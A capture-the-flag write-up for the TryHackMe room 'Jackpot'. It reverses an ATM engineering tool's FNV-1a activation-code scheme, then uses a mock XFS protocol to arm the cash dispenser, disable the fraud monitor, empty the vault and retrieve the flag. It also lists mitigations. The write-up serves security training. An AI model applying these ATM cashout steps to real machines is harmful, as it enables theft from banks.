# THM — Jackpot

```
     ██╗ █████╗  ██████╗██╗  ██╗██████╗  ██████╗ ████████╗
     ██║██╔══██╗██╔════╝██║ ██╔╝██╔══██╗██╔═══██╗╚══██╔══╝
     ██║███████║██║     █████╔╝ ██████╔╝██║   ██║   ██║   
██   ██║██╔══██║██║     ██╔═██╗ ██╔═══╝ ██║   ██║   ██║   
╚█████╔╝██║  ██║╚██████╗██║  ██╗██║     ╚██████╔╝   ██║   
 ╚════╝ ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝      ╚═════╝    ╚═╝   
              TryHackMe — Custom / Challenge
```

---

## Table of Contents

- [Progress Checklist](#progress-checklist)
- [Tools Used](#tools-used)
- [TL;DR](#tldr)
- [Introduction](#introduction)
- [Recon](#recon)
- [Foothold](#foothold)
- [Shell / Initial Access](#shell--initial-access)
- [Escalation Path](#escalation-path)
- [Exploitation](#exploitation)
- [Rabbit Holes](#rabbit-holes)
- [Flag](#flag)
- [Mitigations](#mitigations)
- [Key Takeaway](#key-takeaway)
- [If I Did It Again](#if-i-did-it-again)
- [Changelog](#changelog)

---

## Progress Checklist

- [x] Port scan — 22 (SSH), 8080 (HTTP bank terminal), 9100 (XFS binary protocol)
- [x] Identified "Earth's National Bank — Terminal 004 Engineering Console" on port 8080
- [x] Downloaded `jackpot` binary from web UI
- [x] Reversed binary: ELF64 PIE, stripped — takes 6-digit nonce, outputs 8-digit activation code
- [x] Disassembled `.text`: FNV-1a hash of nonce, second FNV-1a pass over `"ENBANK"` with xorshift on output, `% 10^8`
- [x] Confirmed algorithm: Variant A (`plain` over nonce → `xorshift_after` over "ENBANK" → `% 100_000_000`)
- [x] Enumerated port 9100: XFS-bridge binary protocol; banner sent on connect, needs persistent socket
- [x] Rewrote XFS client (`xfs2.py`) to read banner first, then send command on same socket
- [x] `GETINFO 0x0304` → full command table: `WFS_CMD_CDM_ARM`, `WFS_CMD_CDM_SET_MONITOR`, `WFS_CMD_CDM_DISPENSE`, `WFS_CMD_CDM_GET_FLAG`
- [x] Retrieved current nonce from `/status` API: `993269`
- [x] Computed activation code: `16845467` (via binary; confirmed by reimplemented Python algorithm)
- [x] Sent `EXECUTE 0x4f0` with raw payload `16845467` → `WFS_SUCCESS`, armed
- [x] Sent `EXECUTE 0x4f1 'off'` → fraud monitor disabled
- [x] Loop: `EXECUTE 0x401` × 7 → all 280 notes dispensed
- [x] `EXECUTE 0x4ff` → `WFS_SUCCESS`, flag retrieved

---

## Tools Used

| Tool | Purpose |
|---|---|
| RustScan / Nmap | Port and service discovery |
| feroxbuster | Web content discovery |
| file / xxd / strings | Initial binary analysis |
| checksec | Binary protections survey |
| objdump / readelf | Disassembly and ELF section inspection |
| gdb | Attempted dynamic analysis (PIE breakpoint failed) |
| Python3 (custom `xfs.py` / `xfs2.py`) | XFS binary protocol client |
| curl / jq | ATM status API polling |

---

## TL;DR

The target runs a fake ATM web UI on port 8080 that serves a stripped x86-64 binary called `jackpot`. The binary takes a 6-digit nonce from the ATM screen and outputs an 8-digit activation code derived from two FNV-1a passes with an xorshift mixed in. Port 9100 exposes an XFS-bridge binary protocol — the ATM's engineering interface — but all commands silently return the banner unless you read the banner first on the same persistent socket. Once the protocol framing is figured out, the attack chain is: get the current nonce from the `/status` API, run it through the reversed algorithm to compute the activation code, send it to `WFS_CMD_CDM_ARM` as a raw string payload (not JSON), disable the fraud monitor, loop `WFS_CMD_CDM_DISPENSE` until the vault is empty, then call `WFS_CMD_CDM_GET_FLAG`.

---

## Introduction

Jackpot simulates an ATM cashout — specifically the kind where an attacker gains access to the engineering interface of a cash dispense machine (CDM) and empties the vault. The room uses the XFS/CEN standard, which is the actual protocol stack that real ATM software sits on; most ATM vendors abstract over XFS, so this isn't entirely fictional.

The interesting layers here are: a custom binary protocol over raw TCP, a stripped binary that implements an HMAC-like activation code scheme you have to reverse, and a pile of red herrings in the web UI and content enumeration that go exactly nowhere. The whole challenge is about reading the protocol spec correctly and figuring out that "keepalive" framing is the difference between the server responding and silently returning the same banner every single time.

---

## Recon

### Port Scan

```bash
rustscan -a 10.49.184.196 --ulimit 5000 -b 500 -t 1500 -- -Pn -sV -sC
```

Three open ports:

| Port | Service | Notes |
|---|---|---|
| 22/tcp | SSH | OpenSSH 9.6p1 Ubuntu |
| 8080/tcp | HTTP | Python BaseHTTPServer 0.6 — "Earth's National Bank — Terminal 004 Engineering Console" |
| 9100/tcp | Unknown | No service banner from Nmap; `jetdirect?` guess |

Port 9100 is typically HP JetDirect (printers). It is not a printer.

### Web Recon — Port 8080

The title on port 8080: `Earth's National Bank — Terminal 004 Engineering Console`. The page served a download button. Feroxbuster against `raft-medium-directories.txt` with common extensions found only `/status` and variations of it — all returning the same 399-byte response — before being cancelled. The `/status` endpoint returned live ATM state as JSON:

```bash
curl -s http://10.49.178.119:8080/status | jq .
```

```json
{
  "nonce": "993269",
  "armed": false,
  "monitor_on": true,
  "locked": false,
  "screen": "INSERT CARD",
  "dispensed_total": 0,
  "remaining_notes": 280,
  "cassettes": [
    {"id": "CST1", "denom": 10, "count": 100},
    {"id": "CST2", "denom": 20, "count": 80},
    {"id": "CST3", "denom": 50, "count": 60},
    {"id": "CST4", "denom": 100, "count": 40}
  ],
  "flag_released": false
}
```

The `nonce` field rotates. `flag_released` is the win condition.

---

## Foothold

### Binary Analysis — `jackpot`

The download button on the web UI delivered a file called `jackpot`. Initial checks:

```bash
file Downloads/jackpot
```

```
ELF 64-bit LSB pie executable, x86-64, dynamically linked, stripped
```

```bash
checksec file Downloads/jackpot
```

```
Full RELRO  No Canary  SHSTK & IBT  NX enabled  PIE Enabled  No Symbols  FORTIFY Yes
```

Stripped, PIE, no symbols. `strings` revealed the key clues:

```
ENBANK
[*] session nonce : %s
[*] activation code: %08u
Earth's National Bank - Terminal Engineering Tool
usage: %s <6-digit session code from ATM screen>
```

The binary takes a 6-digit argument and prints an 8-digit activation code. It doesn't have execute permission by default, so direct execution fails:

```bash
./Downloads/jackpot 123456
# zsh: permission denied

/lib64/ld-linux-x86-64.so.2 ./Downloads/jackpot 123456
# [*] session nonce : 123456
# [*] activation code: 47384178
```

Invoking it via the dynamic linker directly bypasses the missing execute bit.

### Reversing the Algorithm

Disassembling `.text` with `objdump -d -M intel`:

The main function:
1. Takes the nonce string as `argv[1]`, validates it's exactly 6 characters
2. Runs an FNV-1a-like hash loop over the nonce bytes: `h ^= byte; h = h * 0x100000001b3`
3. After the first loop, there's a second pass using the string at `.rodata` offset `0x2004` — which is `"ENBANK"` — but with an xorshift applied to the hash after the second pass: `h = h ^ (h >> 0x1d)` before the final `% 0x5f5e100` (100,000,000)

Initial offset for `h` is `0xcbf29ce484222325` — the FNV-1a 64-bit offset basis.

Reimplemented in Python to test against known output:

```python
# hash.py
OFF  = 0xcbf29ce484222325
P    = 0x100000001b3
MASK = 0xFFFFFFFFFFFFFFFF

def plain(data, h=OFF):
    for b in data:
        h ^= b
        h = (h * P) & MASK
    return h

def xorshift_after(data, h=OFF):
    for b in data:
        h ^= b
        h = (h * P) & MASK
    h = (h ^ (h >> 0x1d)) & MASK
    return h

nonce = b"993269"
h1 = plain(nonce, OFF)
h2 = xorshift_after(b"ENBANK", h1)
code = h2 % 100_000_000
print(f"code = {code:08d}")
```

```
code = 16845467
```

Matches the binary output for nonce `993269`. The algorithm: **FNV-1a over nonce (no xorshift) → FNV-1a over `"ENBANK"` seeded from pass 1 (xorshift applied after the loop) → modulo 10^8**.

---

## Shell / Initial Access

There is no shell on this box. The attack is entirely protocol-based: reverse the binary, speak the XFS protocol correctly, and drain the ATM.

### XFS Protocol — Port 9100

Sending anything to port 9100 returns what looks like a JSON banner:

```json
{
  "service": "Branch Engineering Gateway",
  "protocol": "XFS bridge",
  "request_format": "1 byte msg_type + 4 byte big-endian command id + 2 byte big-endian length + <length> bytes of data",
  "reply_format": "2 byte big-endian length + <length> bytes of JSON",
  "msg_types": {"GETINFO": "0x01", "EXECUTE": "0x02"},
  "hint": "query command 0x0304 (WFS_INF_CDM_CAPABILITIES) with msg_type GETINFO for the full command table"
}
```

Initial XFS client (`xfs.py`) sent the request on a fresh socket and read back the reply. Every single command — valid, invalid, GETINFO, EXECUTE, empty, `{}` — returned the identical banner. The server appeared to be ignoring all input.

The fix: the banner is sent **unsolicited on connect**. The server waits for the client to consume it, then processes the actual request on the same connection. Opening a new socket per command means the client reads the banner as the reply and closes before the actual response is sent. Classic connection teardown race.

Rewrote the client (`xfs2.py`) to read the banner first on connect, then send the command, then read the actual reply — all on one persistent socket. This made the protocol work.

---

## Escalation Path

With the protocol working, `GETINFO 0x0304` returned the full command table:

```json
{
  "commands": {
    "WFS_INF_CDM_STATUS":    "0x301",
    "WFS_INF_CDM_CASH_UNIT_INFO": "0x303",
    "WFS_INF_CDM_CAPABILITIES":  "0x304",
    "WFS_CMD_CDM_DISPENSE":  "0x401",
    "WFS_CMD_CDM_ARM":       "0x4f0",
    "WFS_CMD_CDM_SET_MONITOR": "0x4f1",
    "WFS_CMD_CDM_GET_FLAG":  "0x4ff"
  },
  "max_dispense": 40
}
```

The sequence to drain the vault: ARM → disable monitor → DISPENSE loop → GET_FLAG.

---

## Exploitation

### Step 1 — Get current nonce

```bash
curl -s http://10.49.178.119:8080/status | jq -r .nonce
```

```
993269
```

### Step 2 — Compute activation code

```bash
/lib64/ld-linux-x86-64.so.2 ./Downloads/jackpot 993269
```

```
[*] session nonce : 993269
[*] activation code: 16845467
```

### Step 3 — ARM the CDM

The `WFS_CMD_CDM_ARM` command expects the activation code as the raw data payload — not wrapped in JSON:

```bash
python3 xfs2.py 0x02 0x4f0 '16845467'
```

```json
{"rc": "WFS_SUCCESS", "detail": "armed - supervisor mode"}
```

Sending `{"code": "16845467"}` with any field name returns `WFS_ERR_CDM_INVALIDCODE`. The server validates a plain string payload matching the activation code, not a JSON structure.

### Step 4 — Disable fraud monitor

```bash
python3 xfs2.py 0x02 0x4f1 'off'
```

```json
{"rc": "WFS_SUCCESS", "monitor_on": false}
```

### Step 5 — Dispense loop

280 notes, 40 per call, 7 calls:

```bash
for i in $(seq 1 8); do
  python3 xfs2.py 0x02 0x401 ''
  curl -s http://10.49.178.119:8080/status | jq -c '{dispensed_total,remaining_notes,flag_released}'
  rem=$(curl -s http://10.49.178.119:8080/status | jq -r .remaining_notes)
  [ "$rem" -eq 0 ] && break
done
```

After 7 calls:

```json
{
  "rc": "WFS_SUCCESS",
  "notes": 40,
  "value": 400,
  "remaining_notes": 0,
  "detail": "vault empty - cashout proven; GET_FLAG now available"
}
```

### Step 6 — Get the flag

```bash
python3 xfs2.py 0x02 0x4ff ''
```

```json
{
  "rc": "WFS_SUCCESS",
  "flag": "THM{n0_card_n0_pin_just_the_wr0ng_v0ice_speaking_XFS}"
}
```

---

## Rabbit Holes

**Feroxbuster on port 8080:** Spent time running directory scans against the web UI. Found only `/status` and duplicate extensions of it. The web surface is exactly one download endpoint and one status API — there is nothing else there.

**Initial `xfs.py` one-shot client:** Every command returned the identical banner regardless of content. Spent significant time assuming the issue was the protocol framing (wrong byte order, wrong length field, missing null terminator, wrong command IDs). None of those were the problem. The server sends a banner on connect unconditionally; a client that opens a new socket per request reads the banner as the reply and misses the actual response every single time. The fix was a persistent socket — read banner first, then command.

**JSON payload for `WFS_CMD_CDM_ARM`:** After getting the protocol working, all attempts to send the activation code in JSON format (`{"code":"16845467"}`, `{"activationCode":16845467}`, `{"code":16845467}`, tried 7+ field names) returned `WFS_ERR_CDM_INVALIDCODE`. The server expected the raw numeric string as the entire data payload with no wrapping. This took about 15 minutes of iteration.

**GDB dynamic analysis on the binary:** Attempted to set a breakpoint at `0x116c` (just before the final division) to read the hash from `$rax` at runtime. Failed twice — first because the binary lacked execute permission (forgot `chmod +x` before the `gdb` call), then because PIE relocates the binary at runtime and the static address `0x116c` doesn't exist in memory until it's rebased. The correct approach is to break on `starti`, read the base address, and add the offset — but by this point the Python reimplementation already matched the binary output exactly, so gdb wasn't needed.

**Trying to type Python code directly into zsh:** Pasted the `def fnv1a(...)` function block into the terminal interactively. zsh tried to execute each line as a separate command and threw parse errors. Not Python's fault.

---

## Flag

| Flag | Value |
|---|---|
| Flag | `THM{n0_card_n0_pin_just_the_wr0ng_v0ice_speaking_XFS}` |

---

## Mitigations

**Activation code algorithm security:** The activation code is derived from FNV-1a — a checksum algorithm, not a cryptographic hash. FNV-1a has no key, no secret, and no resistance to reverse engineering. An attacker who obtains the binary can recover the full algorithm in minutes. A proper implementation would use HMAC-SHA256 with a secret key stored in hardware-protected storage (TPM or HSM), making the activation code impossible to replicate without the hardware secret even if the algorithm is known.

**Unauthenticated XFS engineering interface on the network:** The XFS gateway on port 9100 accepts connections from any host, requires no authentication layer before accepting EXECUTE commands, and trusts the activation code as the sole authorization gate. A real ATM engineering interface should be accessible only over a dedicated management network or through a VPN, and should require mutual TLS client certificates before any command is processed.

**Fraud monitor as an optional disable:** The fraud monitor (`WFS_CMD_CDM_SET_MONITOR`) can be disabled by any authenticated supervisor session. If the monitoring system is a security control, it should not be defeatable through the same interface it is meant to protect. Disabling it should require a second authorization factor or should only be possible from a physically separate management console.

**Binary distribution via unauthenticated HTTP:** The `jackpot` binary was served over plain HTTP from a port accessible to anyone on the network. An attacker who can download the binary can reverse it. Tools like this should not be distributed from the network-facing service they authenticate to — they belong on physically controlled maintenance laptops or dedicated provisioning systems.

---

## Key Takeaway

The critical insight here is protocol framing: the XFS server sends an unsolicited banner on every new connection, and the reply to your command comes after that. A client that opens a fresh socket per request reads the banner as the reply and silently misses every actual response. This kind of "greeting + command" pattern is common in legacy industrial and banking protocols — Telnet, FTP, SMTP, and others all do it. When every command returns the same result regardless of input, the first thing to check is whether you're reading the right frame.

The binary reversal lesson is also worth keeping: stripped + PIE + no canary doesn't mean the algorithm is hidden. `objdump` and `strings` together exposed the constant `0xcbf29ce484222325` (FNV-1a offset basis) and the string `"ENBANK"` in `.rodata`. Those two facts determined the algorithm family and the second-pass input immediately. You don't always need dynamic analysis to understand what a binary does.

---

## If I Did It Again

Skip feroxbuster entirely. There's nothing on the web surface beyond `/status` — the page title says "Terminal Engineering Tool" and there's a single download button. The web UI exists to deliver the binary and expose the nonce. Five minutes of reading the page source is worth more than a 90-second directory scan.

For the protocol, the first question when every command returns the same thing should be "is my client reading a stale frame?" before assuming wrong command IDs or wrong byte order. A `timeout 5 nc jackpot.thm 9100 | xxd | head` to see whether the banner arrives unprompted would have pointed to the persistent-socket fix immediately.

For the binary, `chmod +x` before attempting any dynamic analysis. Also: PIE means no static breakpoints in gdb — always `starti` first, read the load base from `/proc/<pid>/maps`, then add your offset.

---

## Changelog

| Version | Date | Notes |
|---|---|---|
| 1.0 | 2026-11-06 | Initial writeup |

---

<a name="top"></a>[↑ Back to top](#table-of-contents)
